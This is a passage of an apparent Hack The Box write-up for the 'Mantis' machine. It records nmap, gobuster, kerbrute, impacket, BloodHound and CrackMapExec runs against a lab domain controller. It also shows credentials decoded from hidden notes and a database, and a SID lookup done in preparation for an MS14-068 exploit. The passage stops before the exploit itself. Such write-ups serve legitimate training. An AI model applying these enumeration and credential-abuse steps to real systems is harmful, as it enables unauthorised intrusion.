+<span style="color: #F8F8F2">|</span>_<span style="color: #F8F8F2">  </span>message_signing:<span style="color: #F8F8F2"> </span>required
+<span style="color: #F8F8F2">|</span>_clock-skew:<span style="color: #F8F8F2"> </span>mean:<span style="color: #F8F8F2"> </span>-6h25m42s,<span style="color: #F8F8F2"> </span>deviation:<span style="color: #F8F8F2"> </span>1h30m43s,<span style="color: #F8F8F2"> </span>median:<span style="color: #F8F8F2"> </span>-7h00m00s
+<span style="color: #F8F8F2">| </span>smb2-time:<span style="color: #F8F8F2"> </span>
+<span style="color: #F8F8F2">|   </span>date:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2023</span>-07-26T12:49:27
+<span style="color: #F8F8F2">|</span>_<span style="color: #F8F8F2">  </span>start_date:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2023</span>-07-26T12:29:02
+
+Service<span style="color: #F8F8F2"> </span>detection<span style="color: #F8F8F2"> </span>performed.<span style="color: #F8F8F2"> </span>Please<span style="color: #F8F8F2"> </span>report<span style="color: #F8F8F2"> </span>any<span style="color: #F8F8F2"> </span>incorrect<span style="color: #F8F8F2"> </span>results<span style="color: #F8F8F2"> </span>at<span style="color: #F8F8F2"> </span>https://nmap.org/submit/<span style="color: #F8F8F2"> </span>.
+<span style="color: #959077"># Nmap done at Wed Jul 26 15:49:50 2023 -- 1 IP address (1 host up) scanned in 95.81 seconds</span>
+</code></pre></div>
+
+<p>Ports UDP nmap format</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>Discovered<span style="color: #F8F8F2"> </span>open<span style="color: #F8F8F2"> </span>port<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">53</span>/udp<span style="color: #F8F8F2"> </span>on<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">10</span>.129.140.187<span style="color: #F8F8F2">                                  </span>
+</code></pre></div>
+
+<hr />
+<h1 id="enumeration">Enumeration</h1>
+<h2 id="port-8080-http-iis">Port 8080 - HTTP (IIS)</h2>
+<p><img alt="&quot;Port 8080&quot;" src="../imgs/assets-mantis/port8080.png" /></p>
+<p>Website is being runned by Orchard CMS</p>
+<p>Directory searching with gobuster returns:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>/archive<span style="color: #F8F8F2">              </span><span style="color: #FF4689">(</span>Status:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">200</span><span style="color: #FF4689">)</span><span style="color: #F8F8F2"> </span><span style="color: #FF4689">[</span>Size:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2866</span><span style="color: #FF4689">]</span>
+/blogs<span style="color: #F8F8F2">                </span><span style="color: #FF4689">(</span>Status:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">200</span><span style="color: #FF4689">)</span><span style="color: #F8F8F2"> </span><span style="color: #FF4689">[</span>Size:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2913</span><span style="color: #FF4689">]</span>
+/admin<span style="color: #F8F8F2">                </span><span style="color: #FF4689">(</span>Status:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">302</span><span style="color: #FF4689">)</span><span style="color: #F8F8F2"> </span><span style="color: #FF4689">[</span>Size:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">163</span><span style="color: #FF4689">]</span><span style="color: #F8F8F2"> </span><span style="color: #FF4689">[</span>--&gt;<span style="color: #F8F8F2"> </span>/Users/Account/AccessDenied?ReturnUrl<span style="color: #FF4689">=</span>%2Fadmin<span style="color: #FF4689">]</span>
+/tags<span style="color: #F8F8F2">                 </span><span style="color: #FF4689">(</span>Status:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">200</span><span style="color: #FF4689">)</span><span style="color: #F8F8F2"> </span><span style="color: #FF4689">[</span>Size:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2453</span><span style="color: #FF4689">]</span>
+/Archive<span style="color: #F8F8F2">              </span><span style="color: #FF4689">(</span>Status:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">200</span><span style="color: #FF4689">)</span><span style="color: #F8F8F2"> </span><span style="color: #FF4689">[</span>Size:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2866</span><span style="color: #FF4689">]</span>
+/pollArchive<span style="color: #F8F8F2">          </span><span style="color: #FF4689">(</span>Status:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">200</span><span style="color: #FF4689">)</span><span style="color: #F8F8F2"> </span><span style="color: #FF4689">[</span>Size:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2870</span><span style="color: #FF4689">]</span>
+/Blogs<span style="color: #F8F8F2">                </span><span style="color: #FF4689">(</span>Status:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">200</span><span style="color: #FF4689">)</span><span style="color: #F8F8F2"> </span><span style="color: #FF4689">[</span>Size:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2913</span><span style="color: #FF4689">]</span>
+/newsarchive<span style="color: #F8F8F2">          </span><span style="color: #FF4689">(</span>Status:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">200</span><span style="color: #FF4689">)</span><span style="color: #F8F8F2"> </span><span style="color: #FF4689">[</span>Size:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2870</span><span style="color: #FF4689">]</span>
+/news_archive<span style="color: #F8F8F2">         </span><span style="color: #FF4689">(</span>Status:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">200</span><span style="color: #FF4689">)</span><span style="color: #F8F8F2"> </span><span style="color: #FF4689">[</span>Size:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2871</span><span style="color: #FF4689">]</span>
+/Admin<span style="color: #F8F8F2">                </span><span style="color: #FF4689">(</span>Status:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">302</span><span style="color: #FF4689">)</span><span style="color: #F8F8F2"> </span><span style="color: #FF4689">[</span>Size:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">163</span><span style="color: #FF4689">]</span><span style="color: #F8F8F2"> </span><span style="color: #FF4689">[</span>--&gt;<span style="color: #F8F8F2"> </span>/Users/Account/AccessDenied?ReturnUrl<span style="color: #FF4689">=</span>%2FAdmin<span style="color: #FF4689">]</span>
+/*checkout*<span style="color: #F8F8F2">           </span><span style="color: #FF4689">(</span>Status:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">400</span><span style="color: #FF4689">)</span><span style="color: #F8F8F2"> </span><span style="color: #FF4689">[</span>Size:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">3420</span><span style="color: #FF4689">]</span>
+/news-archive<span style="color: #F8F8F2">         </span><span style="color: #FF4689">(</span>Status:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">200</span><span style="color: #FF4689">)</span><span style="color: #F8F8F2"> </span><span style="color: #FF4689">[</span>Size:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2871</span><span style="color: #FF4689">]</span>
+/shoutbox_archive<span style="color: #F8F8F2">     </span><span style="color: #FF4689">(</span>Status:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">200</span><span style="color: #FF4689">)</span><span style="color: #F8F8F2"> </span><span style="color: #FF4689">[</span>Size:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2875</span><span style="color: #FF4689">]</span>
+/newsletter_archive<span style="color: #F8F8F2">   </span><span style="color: #FF4689">(</span>Status:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">200</span><span style="color: #FF4689">)</span><span style="color: #F8F8F2"> </span><span style="color: #FF4689">[</span>Size:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2877</span><span style="color: #FF4689">]</span>
+/fsb_archive<span style="color: #F8F8F2">          </span><span style="color: #FF4689">(</span>Status:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">200</span><span style="color: #FF4689">)</span><span style="color: #F8F8F2"> </span><span style="color: #FF4689">[</span>Size:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2870</span><span style="color: #FF4689">]</span>
+/poll_archive<span style="color: #F8F8F2">         </span><span style="color: #FF4689">(</span>Status:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">200</span><span style="color: #FF4689">)</span><span style="color: #F8F8F2"> </span><span style="color: #FF4689">[</span>Size:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2871</span><span style="color: #FF4689">]</span>
+/*docroot*<span style="color: #F8F8F2">            </span><span style="color: #FF4689">(</span>Status:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">400</span><span style="color: #FF4689">)</span><span style="color: #F8F8F2"> </span><span style="color: #FF4689">[</span>Size:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">3420</span><span style="color: #FF4689">]</span>
+/fortune500_archive<span style="color: #F8F8F2">   </span><span style="color: #FF4689">(</span>Status:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">200</span><span style="color: #FF4689">)</span><span style="color: #F8F8F2"> </span><span style="color: #FF4689">[</span>Size:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2877</span><span style="color: #FF4689">]</span>
+/*<span style="color: #F8F8F2">                    </span><span style="color: #FF4689">(</span>Status:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">400</span><span style="color: #FF4689">)</span><span style="color: #F8F8F2"> </span><span style="color: #FF4689">[</span>Size:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">3420</span><span style="color: #FF4689">]</span>
+/press_archive<span style="color: #F8F8F2">        </span><span style="color: #FF4689">(</span>Status:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">200</span><span style="color: #FF4689">)</span><span style="color: #F8F8F2"> </span><span style="color: #FF4689">[</span>Size:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2872</span><span style="color: #FF4689">]</span>
+</code></pre></div>
+
+<p>We can easily deduce that archive can have any prefix, also directories are case-insensitive because of IIS.</p>
+<hr />
+<h2 id="port-389-ldap">Port 389 - LDAP</h2>
+<p><img alt="&quot;LDAP anon bind&quot;" src="../imgs/assets-mantis/ldap1.png" /></p>
+<hr />
+<h2 id="port-88-kerberos">Port 88 - Kerberos</h2>
+<p>I fire off a kerbrute in the background and it finds some users:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code><span style="color: #F8F8F2">   </span>__<span style="color: #F8F8F2">             </span>__<span style="color: #F8F8F2">               </span>__<span style="color: #F8F8F2">     </span>
+<span style="color: #F8F8F2">   </span>/<span style="color: #F8F8F2"> </span>/_____<span style="color: #F8F8F2">  </span>_____/<span style="color: #F8F8F2"> </span>/_<span style="color: #F8F8F2">  </span>_______<span style="color: #F8F8F2">  </span>__/<span style="color: #F8F8F2"> </span>/____<span style="color: #F8F8F2"> </span>
+<span style="color: #F8F8F2">  </span>/<span style="color: #F8F8F2"> </span>//_/<span style="color: #F8F8F2"> </span>_<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">\/</span><span style="color: #F8F8F2"> </span>___/<span style="color: #F8F8F2"> </span>__<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">\/</span><span style="color: #F8F8F2"> </span>___/<span style="color: #F8F8F2"> </span>/<span style="color: #F8F8F2"> </span>/<span style="color: #F8F8F2"> </span>/<span style="color: #F8F8F2"> </span>__/<span style="color: #F8F8F2"> </span>_<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">\</span>
+<span style="color: #F8F8F2"> </span>/<span style="color: #F8F8F2"> </span>,&lt;<span style="color: #F8F8F2"> </span>/<span style="color: #F8F8F2">  </span>__/<span style="color: #F8F8F2"> </span>/<span style="color: #F8F8F2">  </span>/<span style="color: #F8F8F2"> </span>/_/<span style="color: #F8F8F2"> </span>/<span style="color: #F8F8F2"> </span>/<span style="color: #F8F8F2">  </span>/<span style="color: #F8F8F2"> </span>/_/<span style="color: #F8F8F2"> </span>/<span style="color: #F8F8F2"> </span>/_/<span style="color: #F8F8F2">  </span>__/
+/_/<span style="color: #F8F8F2">|</span>_<span style="color: #F8F8F2">|</span><span style="color: #AE81FF">\_</span>__/_/<span style="color: #F8F8F2">  </span>/_.___/_/<span style="color: #F8F8F2">   </span><span style="color: #AE81FF">\_</span>_,_/<span style="color: #AE81FF">\_</span>_/<span style="color: #AE81FF">\_</span>__/<span style="color: #F8F8F2">                                        </span>
+
+Version:<span style="color: #F8F8F2"> </span>v1.0.3<span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>9dad6e1<span style="color: #FF4689">)</span><span style="color: #F8F8F2"> </span>-<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">07</span>/26/23<span style="color: #F8F8F2"> </span>-<span style="color: #F8F8F2"> </span>Ronnie<span style="color: #F8F8F2"> </span>Flathers<span style="color: #F8F8F2"> </span>@ropnop
+
+<span style="color: #AE81FF">2023</span>/07/26<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">16</span>:40:21<span style="color: #F8F8F2"> </span>&gt;<span style="color: #F8F8F2">  </span>Using<span style="color: #F8F8F2"> </span>KDC<span style="color: #FF4689">(</span>s<span style="color: #FF4689">)</span>:
+<span style="color: #AE81FF">2023</span>/07/26<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">16</span>:40:21<span style="color: #F8F8F2"> </span>&gt;<span style="color: #F8F8F2">   </span><span style="color: #AE81FF">10</span>.129.141.53:88
+
+<span style="color: #AE81FF">2023</span>/07/26<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">16</span>:40:22<span style="color: #F8F8F2"> </span>&gt;<span style="color: #F8F8F2">  </span><span style="color: #FF4689">[</span>+<span style="color: #FF4689">]</span><span style="color: #F8F8F2"> </span>VALID<span style="color: #F8F8F2"> </span>USERNAME:<span style="color: #F8F8F2">       </span>james@htb.local
+<span style="color: #AE81FF">2023</span>/07/26<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">16</span>:41:16<span style="color: #F8F8F2"> </span>&gt;<span style="color: #F8F8F2">  </span><span style="color: #FF4689">[</span>+<span style="color: #FF4689">]</span><span style="color: #F8F8F2"> </span>VALID<span style="color: #F8F8F2"> </span>USERNAME:<span style="color: #F8F8F2">       </span>administrator@htb.local
+<span style="color: #AE81FF">2023</span>/07/26<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">16</span>:42:12<span style="color: #F8F8F2"> </span>&gt;<span style="color: #F8F8F2">  </span><span style="color: #FF4689">[</span>+<span style="color: #FF4689">]</span><span style="color: #F8F8F2"> </span>VALID<span style="color: #F8F8F2"> </span>USERNAME:<span style="color: #F8F8F2">       </span>mantis@htb.local
+</code></pre></div>
+
+<hr />
+<h2 id="port-1337-http">Port 1337 - HTTP</h2>
+<p>This is another Microsoft IIS server, running another scan on this yields:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>/secure_notes
+/orchard
+</code></pre></div>
+
+<p><img alt="&quot;Secret Directory&quot;" src="../imgs/assets-mantis/secure_notes.png" /></p>
+<p>The <code>web.config</code> 404s</p>
+<p><code>/secure_notes</code> contains</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt:
+<span style="color: #AE81FF">1</span>.<span style="color: #F8F8F2"> </span>Download<span style="color: #F8F8F2"> </span>OrchardCMS
+<span style="color: #AE81FF">2</span>.<span style="color: #F8F8F2"> </span>Download<span style="color: #F8F8F2"> </span>SQL<span style="color: #F8F8F2"> </span>server<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2014</span><span style="color: #F8F8F2"> </span>Express<span style="color: #F8F8F2"> </span>,create<span style="color: #F8F8F2"> </span>user<span style="color: #F8F8F2"> </span><span style="color: #E6DB74">&quot;admin&quot;</span>,and<span style="color: #F8F8F2"> </span>create<span style="color: #F8F8F2"> </span>orcharddb<span style="color: #F8F8F2"> </span>database
+<span style="color: #AE81FF">3</span>.<span style="color: #F8F8F2"> </span>Launch<span style="color: #F8F8F2"> </span>IIS<span style="color: #F8F8F2"> </span>and<span style="color: #F8F8F2"> </span>add<span style="color: #F8F8F2"> </span>new<span style="color: #F8F8F2"> </span>website<span style="color: #F8F8F2"> </span>and<span style="color: #F8F8F2"> </span>point<span style="color: #F8F8F2"> </span>to<span style="color: #F8F8F2"> </span>Orchard<span style="color: #F8F8F2"> </span>CMS<span style="color: #F8F8F2"> </span>folder<span style="color: #F8F8F2"> </span>location.
+<span style="color: #AE81FF">4</span>.<span style="color: #F8F8F2"> </span>Launch<span style="color: #F8F8F2"> </span>browser<span style="color: #F8F8F2"> </span>and<span style="color: #F8F8F2"> </span>navigate<span style="color: #F8F8F2"> </span>to<span style="color: #F8F8F2"> </span>http://localhost:8080
+<span style="color: #AE81FF">5</span>.<span style="color: #F8F8F2"> </span>Set<span style="color: #F8F8F2"> </span>admin<span style="color: #F8F8F2"> </span>password<span style="color: #F8F8F2"> </span>and<span style="color: #F8F8F2"> </span>configure<span style="color: #F8F8F2"> </span>sQL<span style="color: #F8F8F2"> </span>server<span style="color: #F8F8F2"> </span>connection<span style="color: #F8F8F2"> </span>string.
+<span style="color: #AE81FF">6</span>.<span style="color: #F8F8F2"> </span>Add<span style="color: #F8F8F2"> </span>blog<span style="color: #F8F8F2"> </span>pages<span style="color: #F8F8F2"> </span>with<span style="color: #F8F8F2"> </span>admin<span style="color: #F8F8F2"> </span>user.
+<span style="color: #FF4689">[</span>trunc<span style="color: #FF4689">]</span>...<span style="color: #F8F8F2"> </span>-&gt;<span style="color: #F8F8F2"> </span>trunc<span style="color: #F8F8F2"> </span>because<span style="color: #F8F8F2"> </span>of<span style="color: #F8F8F2"> </span>whitespace
+Credentials<span style="color: #F8F8F2"> </span>stored<span style="color: #F8F8F2"> </span><span style="color: #66D9EF">in</span><span style="color: #F8F8F2"> </span>secure<span style="color: #F8F8F2"> </span>format
+OrchardCMS<span style="color: #F8F8F2"> </span>admin<span style="color: #F8F8F2"> </span>creadentials<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">010000000110010001101101001000010110111001011111010100000100000001110011011100110101011100110000011100100110010000100001</span>
+SQL<span style="color: #F8F8F2"> </span>Server<span style="color: #F8F8F2"> </span>sa<span style="color: #F8F8F2"> </span>credentials<span style="color: #F8F8F2"> </span>file<span style="color: #F8F8F2"> </span>namez
+</code></pre></div>
+
+<p>The base64 in the filename decodes to: <code>m$$ql_S@_P@ssW0rd!</code> and the username is <code>sa</code></p>
+<p>The creds for orchard cms decode to <code>@dm!n_P@ssW0rd!</code></p>
+<hr />
+<h2 id="port-1433-mssql">Port 1433 - MSSQL</h2>
+<p>We can access the mssql server using impacket<br />
+<img alt="&quot;Impacket-mssqlclient&quot;" src="../imgs/assets-mantis/impacket-mssql.png" /><br />
+I was encountering some stability issues with the box and had to restart it.</p>
+<p>I prefer to use a GUI to interact with MSSQL so I'll fire up DBeaver</p>
+<p>If you get an SSL error that mentions TLS 1.0 and TLS 1.1, you can fix it using: https://github.com/dbeaver/dbeaver/issues/12668#issuecomment-909301270 on Kali(may vary, if this doesn't work one of the others in the repo issue will)</p>
+<p>Anyway, this link told me where the credentials are stored: https://weblogs.asp.net/bleroy/recovering-the-admin-password-in-orchard</p>
+<p>So I took a look in <code>blog_Orchard_Users_UserPartRecord</code>, and found some creds:</p>
+<p><img alt="&quot;Credentials&quot;" src="../imgs/assets-mantis/db_creds.png" /></p>
+<p>One is a salted hash the other is plaintext:</p>
+<ul>
+<li>james:J@m3s_P@ssW0rd!</li>
+<li>admin:AL1337E2D6YHm0iIysVzG8LA76OozgMSlyOJk1Ov5WCGK+lgKY6vrQuswfWHKZn2+A== (salt is UBwWF1CQCsaGc/P7jIR/kg==)</li>
+</ul>
+<p>I tried the credentials on the website, but it errored out! LDAP was also a bust</p>
+<hr />
+<h1 id="bloodhound">Bloodhound?</h1>
+<p>Running bloodhound-python(ingestor) to gather information:<br />
+<img alt="&quot;Bloodhound ingestor&quot;" src="../imgs/assets-mantis/bloodhound-python.png" /></p>
+<p>Analysing the information we find that the user james can RDP into the box:<br />
+<img alt="&quot;RDP Graph&quot;" src="../imgs/assets-mantis/rdp-privs.png" /></p>
+<p>I don't see how that's helpful since there's no RDP service available on the box by the looks of it? Nothing else sticks out.</p>
+<hr />
+<h2 id="the-breakthrough">The Breakthrough</h2>
+<p>If we had paid attention to the Windows Version Information that CrackMapExec prints we would have noticed that the Service Pack stands out</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>ma1ware@shadow:~/pentest/htb/boxes/Mantis$<span style="color: #F8F8F2"> </span>crackmapexec<span style="color: #F8F8F2"> </span>smb<span style="color: #F8F8F2"> </span>mantis<span style="color: #F8F8F2"> </span>-u<span style="color: #F8F8F2"> </span><span style="color: #E6DB74">&#39;james&#39;</span><span style="color: #F8F8F2"> </span>-p<span style="color: #F8F8F2"> </span>creds<span style="color: #F8F8F2"> </span>--shares
+/home/ma1ware/.local/lib/python3.11/site-packages/requests/__init__.py:102:<span style="color: #F8F8F2"> </span>RequestsDependencyWarning:<span style="color: #F8F8F2"> </span>urllib3<span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span><span style="color: #AE81FF">1</span>.26.12<span style="color: #FF4689">)</span><span style="color: #F8F8F2"> </span>or<span style="color: #F8F8F2"> </span>chardet<span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span><span style="color: #AE81FF">5</span>.1.0<span style="color: #FF4689">)</span>/charset_normalizer<span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span><span style="color: #AE81FF">2</span>.0.12<span style="color: #FF4689">)</span><span style="color: #F8F8F2"> </span>doesn<span style="color: #E6DB74">&#39;t match a supported version!</span>
+<span style="color: #E6DB74">  warnings.warn(&quot;urllib3 ({}) or chardet ({})/charset_normalizer ({}) doesn&#39;</span>t<span style="color: #F8F8F2"> </span>match<span style="color: #F8F8F2"> </span>a<span style="color: #F8F8F2"> </span>supported<span style="color: #F8F8F2"> </span><span style="color: #E6DB74">&quot;</span>
+<span style="color: #E6DB74">SMB         mantis.htb.local 445    MANTIS           [*] Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (name:MANTIS) (domain:htb.local) (signing:True) (SMBv1:True)</span>
+<span style="color: #E6DB74">SMB         mantis.htb.local 445    MANTIS           [+] htb.local\james:J@m3s_P@ssW0rd! </span>
+<span style="color: #E6DB74">SMB         mantis.htb.local 445    MANTIS           [+] Enumerated shares</span>
+<span style="color: #E6DB74">SMB         mantis.htb.local 445    MANTIS           Share           Permissions     Remark</span>
+<span style="color: #E6DB74">SMB         mantis.htb.local 445    MANTIS           -----           -----------     ------</span>
+<span style="color: #E6DB74">SMB         mantis.htb.local 445    MANTIS           ADMIN</span>$<span style="color: #E6DB74">                          Remote Admin</span>
+<span style="color: #E6DB74">SMB         mantis.htb.local 445    MANTIS           C</span>$<span style="color: #E6DB74">                              Default share</span>
+<span style="color: #E6DB74">SMB         mantis.htb.local 445    MANTIS           IPC</span>$<span style="color: #E6DB74">                            Remote IPC</span>
+<span style="color: #E6DB74">SMB         mantis.htb.local 445    MANTIS           NETLOGON        READ            Logon server share </span>
+<span style="color: #E6DB74">SMB         mantis.htb.local 445    MANTIS           SYSVOL          READ            Logon server share </span>
+<span style="color: #E6DB74">ma1ware@shadow:~/pentest/htb/boxes/Mantis</span>$<span style="color: #E6DB74"> </span>
+</code></pre></div>
+
+<p>Initially I thought that there might be a possible eternalblue attack but  I quickly discarded that after a quick check</p>
+<p>Googling around with the Windows version info we get MS14-068 which affects domain controllers? Coincidence I think not.</p>
+<p>The exploit also exists in metasploit so we'll do the exploit both ways.</p>
+<h2 id="metasploit-framework">Metasploit Framework</h2>
+<p>Naturally as I was about to move onto the exploitation process the box crashed again! So starting up a new instance of the box</p>
+<p>First we need to get the sid of the user:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>ma1ware@shadow:~/pentest/htb/boxes/Mantis$<span style="color: #F8F8F2"> </span>rpcclient<span style="color: #F8F8F2"> </span>-U<span style="color: #F8F8F2"> </span><span style="color: #E6DB74">&#39;james&#39;</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">10</span>.129.165.179
+Password<span style="color: #F8F8F2"> </span><span style="color: #66D9EF">for</span><span style="color: #F8F8F2"> </span><span style="color: #FF4689">[</span>WORKGROUP<span style="color: #AE81FF">\j</span>ames<span style="color: #FF4689">]</span>:
+rpcclient<span style="color: #F8F8F2"> </span>$&gt;<span style="color: #F8F8F2"> </span>lookupnames<span style="color: #F8F8F2"> </span>james
+james<span style="color: #F8F8F2"> </span>S-1-5-21-4220043660-4019079961-2895681657-1103<span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>User:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">1</span><span style="color: #FF4689">)</span>
+rpcclient<span style="color: #F8F8F2"> </span>$&gt;<span style="color: #F8F8F2"> </span>
+</code></pre></div>
+
+<p>I also tried with impacket and that also worked "somewhat"</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>ma1ware@shadow:~/pentest/htb/boxes/Mantis$<span style="color: #F8F8F2"> </span>impacket-lookupsid<span style="color: #F8F8F2"> </span>htb.local/james@10.129.165.179
+Impacket<span style="color: #F8F8F2"> </span>v0.10.0<span style="color: #F8F8F2"> </span>-<span style="color: #F8F8F2"> </span>Copyright<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2022</span><span style="color: #F8F8F2"> </span>SecureAuth<span style="color: #F8F8F2"> </span>Corporation
+
+Password:
+<span style="color: #FF4689">[</span>*<span style="color: #FF4689">]</span><span style="color: #F8F8F2"> </span>Brute<span style="color: #F8F8F2"> </span>forcing<span style="color: #F8F8F2"> </span>SIDs<span style="color: #F8F8F2"> </span>at<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">10</span>.129.165.179
+<span style="color: #FF4689">[</span>*<span style="color: #FF4689">]</span><span style="color: #F8F8F2"> </span>StringBinding<span style="color: #F8F8F2"> </span>ncacn_np:10.129.165.179<span style="color: #FF4689">[</span><span style="color: #AE81FF">\p</span>ipe<span style="color: #AE81FF">\l</span>sarpc<span style="color: #FF4689">]</span>
+<span style="color: #FF4689">[</span>*<span style="color: #FF4689">]</span><span style="color: #F8F8F2"> </span>Domain<span style="color: #F8F8F2"> </span>SID<span style="color: #F8F8F2"> </span>is:<span style="color: #F8F8F2"> </span>S-1-5-21-4220043660-4019079961-2895681657
+<span style="color: #AE81FF">498</span>:<span style="color: #F8F8F2"> </span>HTB<span style="color: #AE81FF">\E</span>nterprise<span style="color: #F8F8F2"> </span>Read-only<span style="color: #F8F8F2"> </span>Domain<span style="color: #F8F8F2"> </span>Controllers<span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>SidTypeGroup<span style="color: #FF4689">)</span>
+<span style="color: #AE81FF">500</span>:<span style="color: #F8F8F2"> </span>HTB<span style="color: #AE81FF">\A</span>dministrator<span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>SidTypeUser<span style="color: #FF4689">)</span>
+<span style="color: #AE81FF">501</span>:<span style="color: #F8F8F2"> </span>HTB<span style="color: #AE81FF">\G</span>uest<span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>SidTypeUser<span style="color: #FF4689">)</span>
+<span style="color: #AE81FF">502</span>:<span style="color: #F8F8F2"> </span>HTB<span style="color: #AE81FF">\k</span>rbtgt<span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>SidTypeUser<span style="color: #FF4689">)</span>
+<span style="color: #AE81FF">512</span>:<span style="color: #F8F8F2"> </span>HTB<span style="color: #AE81FF">\D</span>omain<span style="color: #F8F8F2"> </span>Admins<span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>SidTypeGroup<span style="color: #FF4689">)</span>
+<span style="color: #AE81FF">513</span>:<span style="color: #F8F8F2"> </span>HTB<span style="color: #AE81FF">\D</span>omain<span style="color: #F8F8F2"> </span>Users<span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>SidTypeGroup<span style="color: #FF4689">)</span>
+<span style="color: #AE81FF">514</span>:<span style="color: #F8F8F2"> </span>HTB<span style="color: #AE81FF">\D</span>omain<span style="color: #F8F8F2"> </span>Guests<span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>SidTypeGroup<span style="color: #FF4689">)</span>
+<span style="color: #AE81FF">515</span>:<span style="color: #F8F8F2"> </span>HTB<span style="color: #AE81FF">\D</span>omain<span style="color: #F8F8F2"> </span>Computers<span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>SidTypeGroup<span style="color: #FF4689">)</span>
+<span style="color: #AE81FF">516</span>:<span style="color: #F8F8F2"> </span>HTB<span style="color: #AE81FF">\D</span>omain<span style="color: #F8F8F2"> </span>Controllers<span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>SidTypeGroup<span style="color: #FF4689">)</span>
+<span style="color: #AE81FF">517</span>:<span style="color: #F8F8F2"> </span>HTB<span style="color: #AE81FF">\C</span>ert<span style="color: #F8F8F2"> </span>Publishers<span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>SidTypeAlias<span style="color: #FF4689">)</span>
+<span style="color: #AE81FF">518</span>:<span style="color: #F8F8F2"> </span>HTB<span style="color: #AE81FF">\S</span>chema<span style="color: #F8F8F2"> </span>Admins<span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>SidTypeGroup<span style="color: #FF4689">)</span>
+<span style="color: #AE81FF">519</span>:<span style="color: #F8F8F2"> </span>HTB<span style="color: #AE81FF">\E</span>nterprise<span style="color: #F8F8F2"> </span>Admins<span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>SidTypeGroup<span style="color: #FF4689">)</span>
